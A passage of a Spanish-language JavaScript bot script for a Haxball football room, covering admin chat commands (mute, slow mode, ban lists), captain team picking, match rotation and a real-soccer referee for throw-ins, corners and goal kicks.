		var cstm = "𝗟𝗶𝘀𝘁𝗮 𝗱𝗲 𝗷𝘂𝗴𝗮𝗱𝗼𝗿𝗲𝘀 𝘀𝗶𝗹𝗲𝗻𝗰𝗶𝗮𝗱𝗼𝘀: ";
		for (var i = 0; i < extendedP.length; i++) {
			if (room.getPlayer(extendedP[i][eP.ID]) != null && getMute(room.getPlayer(extendedP[i][eP.ID]))) {
				if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ").length) {
					room.sendAnnouncement(cstm, player.id, 0xFFFF00);
					cstm = "... ";
				}
				cstm += room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ";
			}
		}
		if (cstm == "𝗟𝗶𝘀𝘁𝗮 𝗱𝗲 𝗷𝘂𝗴𝗮𝗱𝗼𝗿𝗲𝘀 𝘀𝗶𝗹𝗲𝗻𝗰𝗶𝗮𝗱𝗼𝘀: ") {
			room.sendAnnouncement("No hay ningun jugador silenciado.", player.id, 0x33FF33, "bold");
			return false;
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendAnnouncement(cstm, player.id, 0xFFFF00, "normal");
	}
	else if (["!mute"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			updateTeams();
			var timeOut;
			if (!Number.isNaN(Number.parseInt(message[1])) && message.length > 1) {
				if (Number.parseInt(message[1]) > 0) {
					timeOut = Number.parseInt(message[1]) * 60 * 1000;
				}
				else {
					timeOut = 3 * 60 * 1000;
				}
				if (message[2].length > 1 && message[2][0] == "#") {
					message[2] = message[2].substring(1, message[2].length);
					if (!Number.isNaN(Number.parseInt(message[2])) && room.getPlayer(Number.parseInt(message[2])) != null) {
						if (room.getPlayer(Number.parseInt(message[2])).admin || getMute(room.getPlayer(Number.parseInt(message[2])))) {
							return false;
						}
						setTimeout(function (player) { setMute(player, false); }, timeOut, room.getPlayer(Number.parseInt(message[2])));
						setMute(room.getPlayer(Number.parseInt(message[2])), true);
						sendMsgAll(room.getPlayer(Number.parseInt(message[2])).name + " ha sido silenciado por " + (timeOut / 60000) + " minutos!", 0xFF9500, "bold", 1);
					}
				}
			}
			else if (Number.isNaN(Number.parseInt(message[1]))) {
				if (message[1].length > 1 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
						if (room.getPlayer(Number.parseInt(message[1])).admin || getMute(room.getPlayer(Number.parseInt(message[1])))) {
							return false;
						}
						setTimeout(function (player) { setMute(player, false); }, 3 * 60 * 1000, room.getPlayer(Number.parseInt(message[1])));
						setMute(room.getPlayer(Number.parseInt(message[1])), true);

							room.sendAnnouncement(room.getPlayer(Number.parseInt(message[1])).name + " te han silenciado por 3 minutos.", message[1], 0x33FF33, "bold", 2);
					}
				}
			}
		}
	}
	else if (["!unmute"].includes(message[0].toLowerCase())) {
		if (player.admin && message.length >= 2) {
			if (message[1] == "all") {
				extendedP.forEach((ePlayer) => { ePlayer[eP.MUTE] = false; });
				sendMsgAll("¡Ya no hay ningun jugador silenciado!", 0xE52582, "bold", 1);
			}
			else if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
				setMute(room.getPlayer(Number.parseInt(message[1])), false);
				sendMsgAll(room.getPlayer(Number.parseInt(message[1])).name + " ya no está silenciado", 0xFFFF00, "bold", 1);
			}
			else if (Number.isNaN(Number.parseInt(message[1]))) {
				if (message[1].length > 1 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
						setMute(room.getPlayer(Number.parseInt(message[1])), false);
							sendMsgAll(room.getPlayer(Number.parseInt(message[1])).name + " ya no está silenciado.", 0xFFFF00, "bold", 1);
					}
				}
			}
		}
	}
	else if (["!slow"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			if (message.length == 1) {
				slowMode = 2;
                                room.sendChat("[🐌] Modo lento de 2 segundos activado !");
			}
			else if (message.length == 2) {
				if (!Number.isNaN(Number.parseInt(message[1]))) {
					if (Number.parseInt(message[1]) > 0) {
						slowMode = Number.parseInt(message[1]);
                                                room.sendChat(slowMode + " segundos de modo lento Activado !");
						return false;
					}
				}
				slowMode = 2;
                                room.sendChat("[🐌] Modo lento de 2 segundos activado !");
			}
		}
	}
	else if (["!endslow"].includes(message[0].toLowerCase())) {
		if (player.admin) {
                slowMode != 0 ? room.sendChat("Modo lento desactivado.") : null;
			slowMode = 0;
		}
	}
	else if (["!banlist", "!bans"].includes(message[0].toLowerCase())) {
		if (banList.length == 0) {
			room.sendAnnouncement("¡No hay ningun jugador baneado!", player.id, 0xFFFF00, "bold", 1);
			return false;
		}
		var cstm = "𝗟𝗶𝘀𝘁𝗮 𝗱𝗲 𝗷𝘂𝗴𝗮𝗱𝗼𝗿𝗲𝘀 𝗯𝗮𝗻𝗲𝗮𝗱𝗼𝘀: ";
		for (var i = 0; i < banList.length; i++) {
			if (140 - cstm.length < (banList[i][0] + "[" + (banList[i][1]) + "], ").length) {
				room.sendAnnouncement(cstm, player.id, 0x33FF33, "bold", 1);
				cstm = "... ";
			}
			cstm += banList[i][0] + "[" + (banList[i][1]) + "], ";
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendAnnouncement(cstm, player.id, 0xFF9500, "bold", 1);
	}
	else if (["!clearbans"].includes(message[0].toLowerCase())) {
		if (player.admin) {
			if (message.length == 1) {
				room.clearBans();
				sendMsgAll("Las sanciones han sido removidas por " + player.name + "!", 0x33FF33, "bold", 1);
				banList = [];
			}
			if (message.length == 2) {
				if (!Number.isNaN(Number.parseInt(message[1]))) {
					if (Number.parseInt(message[1]) > 0) {
						ID = Number.parseInt(message[1]);
						room.clearBan(ID);
						if (banList.length != banList.filter((array) => array[1] != ID)) {
							room.sendAnnouncement(banList.filter((array) => array[1] == ID)[0][0] + " ya no está sancionado.", 0xFFFF00, "bold", 1);
						}
						setTimeout(() => { banList = banList.filter((array) => array[1] != ID); }, 20);
					}
				}
			}
		}
	}
	else if (["!bb", "!bye", "!chao"].includes(message[0].toLowerCase())) {
		room.kickPlayer(player.id, "¡Adiós! Vuelve pronto =D", false);
	}
	if (teamR.length != 0 && teamB.length != 0 && inChooseMode) {
		if (player.id == teamR[0].id || player.id == teamB[0].id) { // we care if it's one of the captains choosing
			if (teamR.length <= teamB.length && player.id == teamR[0].id) { // we care if it's red turn && red cap talking
				if (["top", "auto"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[0].id, Team.RED);
					redCaptainChoice = "top";
					clearTimeout(timeOutCap);
					room.sendAnnouncement(player.name + " elegiste top!", player.id, 0xFFFF00, "normal");
					return false;
				}
				else if (["random", "rand"].includes(message[0].toLowerCase())) {
					var r = getRandomInt(teamS.length);
					room.setPlayerTeam(teamS[r].id, Team.RED);
					redCaptainChoice = "random";
					clearTimeout(timeOutCap);
					room.sendAnnouncement(player.name + " elegiste random!", player.id, 0xFFFF00, "normal");
					return false;
				}
				else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
					redCaptainChoice = "bottom";
					clearTimeout(timeOutCap);
					room.sendAnnouncement(player.name + " elegiste bottom!", player.id, 0xFFFF00, "normal");
					return false;
				}
				else if (!Number.isNaN(Number.parseInt(message[0]))) {
					if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
						room.sendAnnouncement("El número que elegiste es inválido!", player.id, 0xFF0000, "bold");
						return false;
					}
					else {
						room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.RED);
						sendMsgAll(player.name + " eligió a " + teamS[Number.parseInt(message[0]) - 1].name + "!", 0xFF7575, "bold", 1);
						return false;
					}
				}
			}
			if (teamR.length > teamB.length && player.id == teamB[0].id) { // we care if it's red turn && red cap talking
				if (["top", "auto"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[0].id, Team.BLUE);
					blueCaptainChoice = "top";
					clearTimeout(timeOutCap);
					room.sendAnnouncement(player.name + " elegiste top!", player.id, 0xFFFF00);
					return false;
				}
				else if (["random", "rand"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
					blueCaptainChoice = "random";
					clearTimeout(timeOutCap);
					room.sendAnnouncement(player.name + " elegiste random!", player.id, 0xFFFF00);
					return false;
				}
				else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
					room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
					blueCaptainChoice = "bottom";
					clearTimeout(timeOutCap);
					room.sendAnnouncement(player.name + " elegiste bottom!", player.id, 0xFFFF00);
					return false;
				}
				else if (!Number.isNaN(Number.parseInt(message[0]))) {
					if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
						room.sendAnnouncement("El número que elegiste es inválido!", player.id, 0xFF0000);
						return false;
					}
					else {
						room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.BLUE);
						sendMsgAll(player.name + " eligió a " + teamS[Number.parseInt(message[0]) - 1].name + "!", 0x6EA5FF, "bold", 1);
						return false;
					}
				}
			}
		}
	}
	if (message[0][0] == "!") {
		return false;
	}
	if (getMute(player)) {
		room.sendAnnouncement("Usted está silenciado.", player.id, 0x33FF33);
		return false;
	}

    else {
        player_msg = "";
        for(let i = 0; i < message.length; i++) {
            player_msg += " " + message[i];
        }
        if(!(player.admin)) {
			if (slowMode > 0) {
				if (!SMSet.has(player.id)) {
					if(player.team == Team.RED) {
						room.sendAnnouncement("🔴 | " + player.name + ": " + player_msg, i, 0xff3333);
						return false;
					} else if(player.team == Team.BLUE) {
						room.sendAnnouncement("🔵 | " + player.name + ": " + player_msg, i, 0x0080ff);
						return false;
					}
				}
				else {
					return false;
				}
			}
			if(player.team == Team.RED) {
				room.sendAnnouncement("🔴 | " + player.name + ": " + player_msg, i, 0xff3333);
				return false;
			} else if(player.team == Team.BLUE) {
				room.sendAnnouncement("🔵 | " + player.name + ": " + player_msg, i, 0x0080ff);
				return false;
			}
        } 

	//𝗟𝗜𝗦𝗧𝗔 𝗗𝗘 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡𝗦
	else {
            if(getAuth(player) === "wJiCfxR6ElwIh8eOJ_8DSazZLoTZyEvHbnkMts6E9Ws") { // Lucas Brave
                room.sendAnnouncement("[♾️] " + player.name + ": " + player_msg, i, 0x2384EB, "bold");
            } 
		else if(getAuth(player) == "F10TjCeFLJpPovNnrA_BBUxV9AisSZOTJzMYYHoOagQ") { // Lucas Opera GX
                room.sendAnnouncement("[♾️] " + player.name + ": " + player_msg, i, 0xFF9500, "bold");
            } 
			return false;
        }
    }
}

room.onPlayerActivity = function(player) {
	setActivity(player, 0);
}

room.onPlayerBallKick = function(player) {
	if (lastPlayersTouched[0] == null || player.id != lastPlayersTouched[0].id) {
		!activePlay ? activePlay = true : null;
		lastTeamTouched = player.team;
		lastPlayersTouched[1] = lastPlayersTouched[0];
		lastPlayersTouched[0] = player;
	}
	if (map == "RSR") {
		game.rsTouchTeam = player.team;
		game.updateLastKicker(player.id, player.name, player.team);
		
		if (game.rsReady == true) {
			var players = room.getPlayerList().filter((player) => player.team != 0);
			players.forEach(function(player) {			
				if (room.getPlayerDiscProperties(player.id).invMass.toFixed(1) != 0.3) {
					room.setPlayerDiscProperties(player.id, {invMass: 0.3});
				}
			});
		}
			
		if (game.rsActive == false && game.rsReady == true && (game.rsCorner == true || game.rsGoalKick == true)) { // make game active on kick from CK/GK
			game.boosterState = true;
			
			game.rsActive = true;
			game.rsReady = false;
			room.setDiscProperties(1, {x: 2000, y: 2000 });
			room.setDiscProperties(2, {x: 2000, y: 2000 });
			room.setDiscProperties(0, {color: "0xffffff"});
			game.rsTimer = 1000000;
			game.warningCount++;	
			
			// set gravity for real soccer corners/goalkicks
			if (game.rsCorner == true) {
				if (room.getDiscProperties(0).y < 0) { //top corner
					room.setDiscProperties(0, {xgravity: room.getPlayerDiscProperties(player.id).xspeed/35*-1, ygravity: 0.05});
					//room.setDiscProperties(0, {xgravity: -0.08, ygravity: 0.05});
				}
				else { //bottom corner
					room.setDiscProperties(0, {xgravity: room.getPlayerDiscProperties(player.id).xspeed/35*-1, ygravity: -0.05});
					//room.setDiscProperties(0, {xgravity: -0.08, ygravity: -0.05});
				}
			}	
			if (game.rsGoalKick == true) {			
				room.setDiscProperties(0, {xgravity: 0, ygravity: room.getPlayerDiscProperties(player.id).yspeed/40*-1});		
			}
			
			game.rsCorner = false;
			game.rsGoalKick = false;
			game.outStatus = "";		
		}		

		if (game.outStatus == "redThrow" || game.outStatus == "blueThrow") {
			game.throwinKicked = true;
		}
	}
}

/* GAME MANAGEMENT */

room.onGameStart = function(byPlayer) {
	game = new Game(Date.now(), room.getScores(), []);
	countAFK = true;
	activePlay = false;
	goldenGoal = false;
	endGameVariable = false;
	lastPlayersTouched = [null, null];
    Rposs = 0;
	Bposs = 0;
	GKList = [];
	allReds = [];
	allBlues = [];
	if (teamR.length == maxTeamSize && teamB.length == maxTeamSize) {
		for (var i = 0; i < maxTeamSize; i++) {
			allReds.push(teamR[i]);
			allBlues.push(teamB[i]);
		}
	}
	for (var i = 0; i < extendedP.length; i++) {
		extendedP[i][eP.GK] = 0;
		extendedP[i][eP.ACT] = 0;
		room.getPlayer(extendedP[i][eP.ID]) == null ? extendedP.splice(i, 1) : null;
	}
	deactivateChooseMode();
	if (map == "RSR") {
		if (byPlayer == null) {
			game = new Game();	
			announce("Game length set to " + gameTime + " minutes");
		}
		else {
			if (room.getScores().timeLimit != 0) {
				gameTime = room.getScores().timeLimit / 60;
			}
			else {
				gameTime = 10;
			}
			room.setTimeLimit(0);			
		}
	}
}

room.onGameStop = function(byPlayer) {
	if (byPlayer.id == 0 && endGameVariable) {
		updateTeams();
		if (inChooseMode) {
			if (players.length == 2 * maxTeamSize) {
				inChooseMode = false;
				resetBtn();
				for (var i = 0; i < maxTeamSize; i++) {
					setTimeout(() => { randomBtn(); }, 400*i);
				}
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else if (lastWinner == Team.BLUE) {
					redToSpecBtn();
					blueToRedBtn();
				}
				else {
					resetBtn();
				}
				setTimeout(() => { topBtn(); }, 500);
			}
		}
		else {
			if (players.length == 2) {
				if (lastWinner == Team.BLUE) {
					room.setPlayerTeam(teamB[0].id, Team.RED);
					room.setPlayerTeam(teamR[0].id, Team.BLUE);
				}
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 3 || players.length >= 2 * maxTeamSize + 1) {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else {
					redToSpecBtn();
					blueToRedBtn();
				}
				setTimeout(() => { topBtn(); }, 200);
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 4) {
				resetBtn();
				setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500);
				setTimeout(() => { room.startGame(); }, 2000);
			}
			else if (players.length == 5 || players.length >= 2 * maxTeamSize + 1) {
				if (lastWinner == Team.RED) {
					blueToSpecBtn();
				}
				else {
					redToSpecBtn();
					blueToRedBtn();
				}
				setTimeout(() => { topBtn(); }, 200);
				activateChooseMode();
			}
			else if (players.length == 6) {
				resetBtn();
				setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); setTimeout(() => { randomBtn(); }, 500); }, 500); }, 500);
				setTimeout(() => { room.startGame(); }, 2000);
			}
		}
	}
	if (map == "RSR") {
		if (byPlayer != null) {
			room.setTimeLimit(gameTime);
		}
	}
}

room.onGamePause = function(byPlayer) {
}

room.onGameUnpause = function (byPlayer) {
	if (teamR.length == 4 && teamB.length == 4 && inChooseMode || (teamR.length == teamB.length && teamS.length < 2 && inChooseMode)) {
		deactivateChooseMode();
	}
}

room.onTeamGoal = function(team) {
	activePlay = false;
	countAFK = false;
	const scores = room.getScores();
	game.scores = scores;
	if (lastPlayersTouched[0] != null && lastPlayersTouched[0].team == team) {
		if (lastPlayersTouched[1] != null && lastPlayersTouched[1].team == team) {
			sendMsgAll("⚽ " + getTime(scores) + " Golazo de " + lastPlayersTouched[0].name + "! Asistencia de " + lastPlayersTouched[1].name + ". Velocidad de tiro: " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"), 0xFF9500, "bold", 1);
			game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], lastPlayersTouched[1]));
		}
		else {
			sendMsgAll("⚽ " + getTime(scores) + " Golazo de " + lastPlayersTouched[0].name + "! Velocidad de tiro: " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"), 0xFF9500, "bold", 1);
			game.goals.push(new Goal(scores.time, team, lastPlayersTouched[0], null));
		}
	}
	else {	
		sendMsgAll("😂 " + getTime(scores) + " Les dije que no trajeran al idiota de " + lastPlayersTouched[0].name + "! Velocidad de tiro: " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"), 0xFF9500, "bold", 1);
		game.goals.push(new Goal(scores.time, team, null, null));
	}
	if (scores.scoreLimit != 0 && (scores.red == scores.scoreLimit || scores.blue == scores.scoreLimit && scores.blue > 0 || goldenGoal == true)) {
		endGame(team);
		goldenGoal = false;
		setTimeout(() => { room.stopGame(); }, 1000);
	}
}

room.onPositionsReset = function() {
	countAFK = true;
	lastPlayersTouched = [null, null];
	if (map == "RSR") {
		if (game.lastPlayAnnounced == true) {
			room.pauseGame(true);
			game.lastPlayAnnounced = false;
			announce("END");
		}
	}
}

function realSoccerRef() {
	blockThrowIn();
	blockGoalKick();
	removeBlock();
	if (game.time == gameTime * 60 && game.extraTimeAnnounced == false) {
		extraTime();
		game.extraTimeAnnounced = true;
	}
	
	if (game.time == game.extraTimeEnd && game.lastPlayAnnounced == false) {
		announce("Last play", null, null, null, 1);
		game.lastPlayAnnounced = true;
	}
	
	if (game.rsCorner == true || game.rsGoalKick == true) { //add extra time
		game.extraTimeCount++;
	}
	
	if (game.rsTimer < 99999 && game.paused == false && game.rsActive == false && game.rsReady == true) {
		game.rsTimer++;
	}
	
	if (game.rsSwingTimer < 150 && game.rsCorner == false && game.rsGoalKick == false) {
		game.rsSwingTimer++;
		if (game.rsSwingTimer > 5) {
			room.setDiscProperties(0, {xgravity: room.getDiscProperties(0).xgravity * 0.97, ygravity: room.getDiscProperties(0).ygravity * 0.97});
		}		
		if (game.rsSwingTimer == 150) {
			room.setDiscProperties(0, {xgravity: 0, ygravity: 0});
		}
	}
	
	
	if (game.boosterState == true) {
		game.boosterCount++;
	}
	
	if (game.boosterCount > 30) {
		game.boosterState = false;
		game.boosterCount = 0;
		room.setDiscProperties(0, {cMask: 63});
	}
	
	
	if (room.getBallPosition().x == 0 && room.getBallPosition().y == 0) {	
		game.rsActive = true;
		game.outStatus = "";
	}
	
	if (game.rsActive == false && game.rsReady == true) { //expire barrier time
		if (game.outStatus == "redThrow") {
			if (game.rsTimer == throwTimeOut - 120) { // warning indicator
				ballWarning("0xff3f34", ++game.warningCount);
			}
			if (game.rsTimer == throwTimeOut && game.bringThrowBack == false) { // switch to blue throw
				game.outStatus = "blueThrow";
				game.rsTimer = 0;				
				room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				sleep(100).then(() => {
					room.setDiscProperties(0, {color: "0x0fbcf9", xspeed: 0, yspeed: 0, x: game.ballOutPositionX, y: game.throwInPosY});
				});
			}
		}
		else if (game.outStatus == "blueThrow") {
			if (game.rsTimer == throwTimeOut - 120) { // warning indicator
				ballWarning("0x0fbcf9", ++game.warningCount);
			}
			if (game.rsTimer == throwTimeOut && game.bringThrowBack == false) { // switch to red throw
				game.outStatus = "redThrow";
				game.rsTimer = 0;						
				room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				sleep(100).then(() => {
					room.setDiscProperties(0, {color: "0xff3f34", xspeed: 0, yspeed: 0, x: game.ballOutPositionX, y: game.throwInPosY});
				});
			}
		}
		else if (game.outStatus == "blueGK" || game.outStatus == "redGK") {
			if (game.rsTimer == gkTimeOut - 120) { // warning indicator
				if (game.outStatus == "blueGK") {
					ballWarning("0x0fbcf9", ++game.warningCount);
				}
				if (game.outStatus == "redGK") {
					ballWarning("0xff3f34", ++game.warningCount);
				}
			}
			if (game.rsTimer == gkTimeOut) {
				game.outStatus = "";
				room.setDiscProperties(0, {color: "0xffffff"});
				game.rsTimer = 1000000;							
			}
		}
		else if (game.outStatus == "blueCK" || game.outStatus == "redCK") {
			if (game.rsTimer == ckTimeOut - 120) {
				if (game.outStatus == "blueCK") {
					ballWarning("0x0fbcf9", ++game.warningCount);
				}
				if (game.outStatus == "redCK") {
					ballWarning("0xff3f34", ++game.warningCount);
				}
			}
			if (game.rsTimer == ckTimeOut) {
				game.outStatus = "";
				room.setDiscProperties(1, {x: 0, y: 2000, radius: 0});
				room.setDiscProperties(2, {x: 0, y: 2000, radius: 0});
				room.setDiscProperties(0, {color: "0xffffff"});
				game.rsTimer = 1000000;							
			}
		}
	}
	
	if (game.rsActive == true) {
		if ((room.getBallPosition().y > 611.45 || room.getBallPosition().y < -611.45)) {
			game.rsActive = false;
			if (game.lastPlayAnnounced == true) {
				room.pauseGame(true);
				game.lastPlayAnnounced = false;
				announce("END");
			}
			
			room.setDiscProperties(0, {xgravity: 0, ygravity: 0});
			
			game.ballOutPositionX = Math.round(room.getBallPosition().x * 10) / 10;
			if (room.getBallPosition().y > 611.45) {
				game.ballOutPositionY = 400485;
				game.throwInPosY = 618;
			}
			if (room.getBallPosition().y < -611.45) {
				game.ballOutPositionY = -400485;
				game.throwInPosY = -618;
			}
			if (room.getBallPosition().x > 1130) {
				game.ballOutPositionX = 1130;
			}
			if (room.getBallPosition().x < -1130) {
				game.ballOutPositionX = -1130;
			}
			
			
			if (game.rsTouchTeam == 1) {				
				room.setDiscProperties(3, {x: game.ballOutPositionX, y: game.throwInPosY, radius: 18 });
				sleep(100).then(() => {
					game.outStatus = "blueThrow";
					game.throwinKicked = false;
					game.rsTimer = 0;
					game.rsReady = true;
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, x: game.ballOutPositionX, y: game.throwInPosY, xgravity: 0, ygravity: 0});
					//announce("🖐️ Throw In: 🔵 Blue");
					room.setDiscProperties(0, {color: "0x0fbcf9"});				
				});	
				sleep(100).then(() => {
					room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				});
			}
			else {				
				room.setDiscProperties(3, {x: game.ballOutPositionX, y: game.throwInPosY, radius: 18 });
				sleep(100).then(() => {
					game.outStatus = "redThrow";
					game.throwinKicked = false;
					game.rsTimer = 0;
					game.rsReady = true;
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, x: game.ballOutPositionX, y: game.throwInPosY, xgravity: 0, ygravity: 0});
					//announce("🖐️ Throw In: 🔴 Red");
					room.setDiscProperties(0, {color: "0xff3f34"});				
				});	
				sleep(100).then(() => {
					room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				});
			}
		}
	
		if (room.getBallPosition().x > 1162.45 && (room.getBallPosition().y > 124 || room.getBallPosition().y < -124)) {
			game.rsActive = false;	
			if (game.lastPlayAnnounced == true) {
				room.pauseGame(true);
				game.lastPlayAnnounced = false;
				announce("END");
			}
			room.setDiscProperties(0, {xgravity: 0, ygravity: 0});
			room.getPlayerList().forEach(function(player) {
				room.setPlayerDiscProperties(player.id, {invMass: 100000});
			});
			
			if (game.rsTouchTeam == 1) {				
				room.setDiscProperties(3, {x: 1060, y: 0, radius: 18 });
				sleep(100).then(() => {					
					game.outStatus = "blueGK";
					game.rsTimer = 0;
					game.rsReady = true;
					//announce("🥅 Goal Kick: 🔵 Blue");
					game.rsGoalKick = true;
					game.rsSwingTimer = 0;
					game.boosterCount = 0;
					game.boosterState = false;
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, x: 1060, y: 0, color: "0x0fbcf9", cMask: 268435519, xgravity: 0, ygravity: 0});
				});
				sleep(3000).then(() => {
					room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				});
			}
			else {	
				//announce("🚩 Corner Kick: 🔴 Red");							
				game.rsSwingTimer = 0;
				if (room.getBallPosition().y < -124) {					
					room.setDiscProperties(3, {x: 1140, y: -590, radius: 18 });
					sleep(100).then(() => {
						game.rsCorner = true;
						game.outStatus = "redCK";
						game.rsTimer = 0;
						game.rsReady = true;
						game.boosterCount = 0;
						game.boosterState = false;
						room.setDiscProperties(0, {x: 1140, y: -590, xspeed: 0, yspeed: 0, color: "0xff3f34", cMask: 268435519, xgravity: 0, ygravity: 0});
						room.setDiscProperties(2, {x: 1150, y: -670, radius: 420 });
						room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
					});
				}
				if (room.getBallPosition().y > 124) {
					room.setDiscProperties(3, {x: 1140, y: 590, radius: 18 });
					sleep(100).then(() => {
						game.rsCorner = true;
						game.outStatus = "redCK";
						game.rsTimer = 0;
						game.rsReady = true;
						game.boosterCount = 0;
						game.boosterState = false;
						room.setDiscProperties(0, {x: 1140, y: 590, xspeed: 0, yspeed: 0, color: "0xff3f34", cMask: 268435519, xgravity: 0, ygravity: 0});
						room.setDiscProperties(2, {x: 1150, y: 670, radius: 420 });
						room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
					});
				}
			}
		}
		if (room.getBallPosition().x < -1162.45 && (room.getBallPosition().y > 124 || room.getBallPosition().y < -124)) {
			game.rsActive = false;
			if (game.lastPlayAnnounced == true) {
				room.pauseGame(true);
				game.lastPlayAnnounced = false;
				announce("END");
			}
			room.setDiscProperties(0, {xgravity: 0, ygravity: 0});
			room.getPlayerList().forEach(function(player) {
				room.setPlayerDiscProperties(player.id, {invMass: 100000});
			});
			
			if (game.rsTouchTeam == 1) {				
				//announce("🚩 Corner Kick: 🔵 Blue");				
				game.rsSwingTimer = 0;
				if (room.getBallPosition().y < -124) {
					room.setDiscProperties(3, {x: -1140, y: -590, radius: 18 });
					sleep(100).then(() => {
						game.rsCorner = true;
						game.outStatus = "blueCK";
						game.rsTimer = 0;
						game.rsReady = true;
						game.boosterCount = 0;
						game.boosterState = false;
						room.setDiscProperties(0, {x: -1140, y: -590, xspeed: 0, yspeed: 0, color: "0x0fbcf9", cMask: 268435519, xgravity: 0, ygravity: 0});
						room.setDiscProperties(1, {x: -1150, y: -670, radius: 420 });
						room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
					});	
				}
				if (room.getBallPosition().y > 124) {
					room.setDiscProperties(3, {x: -1140, y: 590, radius: 18 });
					sleep(100).then(() => {
						game.rsCorner = true;
						game.outStatus = "blueCK";
						game.rsTimer = 0;
						game.rsReady = true;
						game.boosterCount = 0;
						game.boosterState = false;
						room.setDiscProperties(0, {x: -1140, y: 590, xspeed: 0, yspeed: 0, color: "0x0fbcf9", cMask: 268435519, xgravity: 0, ygravity: 0});
						room.setDiscProperties(1, {x: -1150, y: 670, radius: 420 });
						room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
					});		
				}				
			}
			else {				
				room.setDiscProperties(3, {x: -1060, y: 0, radius: 18 });
				sleep(100).then(() => {
					game.outStatus = "redGK";
					game.rsTimer = 0;
					game.rsReady = true;
					//announce("🥅 Goal Kick: 🔴 Red");
					game.rsGoalKick = true;
					game.rsSwingTimer = 0;
					game.boosterCount = 0;
					game.boosterState = false;
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, x: -1060, y: 0, color: "0xff3f34", cMask: 268435519, xgravity: 0, ygravity: 0});
				});
				sleep(3000).then(() => {
					room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				});
			}
		}
	}
	
	if (game.rsActive == false && (game.outStatus == "redThrow" || game.outStatus == "blueThrow")) { 
		if ((room.getBallPosition().y > 611.45 || room.getBallPosition().y < -611.45) && (room.getBallPosition().x < game.ballOutPositionX - throwinDistance || room.getBallPosition().x > game.ballOutPositionX + throwinDistance) && game.bringThrowBack == false) { //if bad throw from run too far
			game.bringThrowBack	= true;
			if (game.outStatus == "redThrow") { //switch to blue throw
				game.rsTimer = 0;
				game.warningCount++;
				game.outStatus = "blueThrow";								
				room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				sleep(100).then(() => {
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, color: "0x0fbcf9", x: game.ballOutPositionX, y: game.throwInPosY});	
				});			
			}
			else if (game.outStatus == "blueThrow") { //switch to red throw
				game.rsTimer = 0;
				game.warningCount++;
				game.outStatus = "redThrow";										
				room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});	
				sleep(100).then(() => {
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, color: "0xff3f34", x: game.ballOutPositionX, y: game.throwInPosY});
				});
			}
				
		}
		
		if (room.getBallPosition().y < 611.45 && room.getBallPosition().y > -611.45 && game.throwinKicked == false && game.pushedOut == false) { //if bad throw from push ball back into active without kick		
			if (game.outStatus == "redThrow") { //switch to blue throw
				game.rsTimer = 0;
				game.warningCount++;
				game.outStatus = "blueThrow";								
				room.setDiscProperties(3, {x: 0, y: 2000, radius: 0});
				sleep(100).then(() => {
					room.setDiscProperties(0, {xspeed: 0, yspeed: 0, color: "0x0fbcf9", x: game.ballOutPositionX, y: game.throwInPosY});
				});					
			}
			else if (game.outStatus == "blueThrow") { //switch to red throw
				game.rsTimer = 0;
